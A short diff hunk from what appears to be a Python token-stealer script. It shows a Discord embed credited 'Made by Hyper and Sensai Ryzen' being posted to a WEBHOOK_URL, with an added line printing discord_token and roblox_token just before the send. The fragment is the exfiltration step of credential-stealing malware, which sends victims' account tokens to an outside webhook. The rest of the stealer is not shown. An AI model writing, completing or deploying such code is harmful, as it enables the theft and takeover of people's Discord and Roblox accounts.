@@ -101,5 +101,5 @@ if __name__ == "__main__":
         ],
         "footer": {"text": "Made by Hyper and Sensai Ryzen"}
     }
-    
+    print("Works", discord_token, roblox_token)
     requests.post(WEBHOOK_URL, json={"embeds": [embed]})
